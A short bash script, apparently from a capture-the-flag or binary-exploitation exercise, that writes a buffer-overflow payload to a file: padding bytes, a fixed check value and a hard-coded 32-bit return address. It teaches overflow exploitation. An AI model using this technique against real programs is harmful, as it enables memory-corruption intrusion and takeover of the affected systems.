#!/bin/bash

payload+=$(printf 'a%.0s' {1..12})

payload+=$(echo -ne '\x54\x45\x4c\x4f')

payload+=$(printf 'a%.0s' {1..12})
payload+=$(echo -ne '\x7c\x88\x04\x08')

echo -ne $payload > payload_1
